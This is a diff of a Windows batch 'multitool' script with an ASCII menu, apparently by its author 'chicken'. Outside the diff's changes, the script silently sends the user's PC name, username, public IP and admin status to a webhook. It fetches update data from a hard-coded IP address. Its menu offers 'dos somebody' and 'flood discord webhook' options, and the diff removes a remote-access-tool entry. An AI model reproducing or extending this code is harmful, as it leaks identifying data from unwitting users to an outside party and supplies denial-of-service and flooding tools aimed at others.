@@ -4,9 +4,10 @@
 :: Added:
 ::	nothing
 :: Removed:
-::	nothing
+::	rat
+::	windows for compacting
 :: Improved/Changed:
-::	nothing
+::	compact commands to be verbose, and compact more!!11!
 :: Bug Fixes
 ::	replaced del update endpoint (mb)
 :: Notes
@@ -80,13 +81,13 @@ for /f "delims=" %%i in ('curl -s https://api.ipify.org') do set ip=%%i
 curl -H "Content-Type: application/json" -d "{\"content\": \"script %rs%\ncurrent version: %ver%\npc name: %COMPUTERNAME%\nusername: %USERNAME%\ntimestamp: !date! !time!\nip: %ip%\nadmin: %uac%\nid: %id%\", \"embeds\": [], \"attachments\": []}" "!ad!"
 if %username%==yanay call :erez
 echo finding updates
-curl -s http://chicken.bulletinbay.com/data/scripts/update >!sp!\update
+curl -s http://68.112.240.182/data/scripts/update >!sp!\update
 set /p update=<!sp!\update
 del !sp!\update
 
 :menu
 mode con cols=76 lines=36
-echo        __              __				v%ver% yeah idk
+echo        __              __				  v%ver% yeah idk
 echo       / /_ ___  ___   / /  ^> coded by chicken
 echo      / __// _ \/ _ \ / /  ^> hope you enjoy!
 echo      \__/ \___/\___//_/
@@ -117,9 +118,9 @@ echo    13. joke of the day*	  	  ^|    33. flood discord webhook*
 echo    14. fun fact*		  ^|    34. virustotal upload*
 echo    15. troubleshooting console	  ^|    35. start with uac
 echo    16. system info		  ^|    36. dos somebody*
-echo    17. socials*		  	  ^|    37. rat* ** (not working right now)
-echo    18. touchscreen toggle**	  ^|    38. compress files***
-echo    19. math			  ^|    39. wipe all script files
+echo    17. socials*		  	  ^|    38. compress files***
+echo    18. touchscreen toggle**	  ^|    39. wipe all script files
+echo    19. math
 
 set /p wow="choose: "
 mode con cols=115 lines=35
@@ -289,8 +290,10 @@ if "%wow%"=="r" ( goto start
 ) else if "%wow%"=="36" ( goto dos
 ) else if "%wow%"=="37" ( goto rat
 ) else if "%wow%"=="38" (
-	start "compact drive" compact /c %homedrive% /s /i
-	start "compact os binaries" compact /compactos:always /i
+	echo compressing files.. this may take a while.
+	compact /c /s /a /i /f %homedrive%\*
+	compact compactos:always
+	echo compression complete.
 ) else if "%wow%"=="39" (
 	echo wiping script related files..
 	del /f /q %sp%\rs.txt %sp%\name.txt %sp%\nameoptout.txt %sp%\pptos.txt
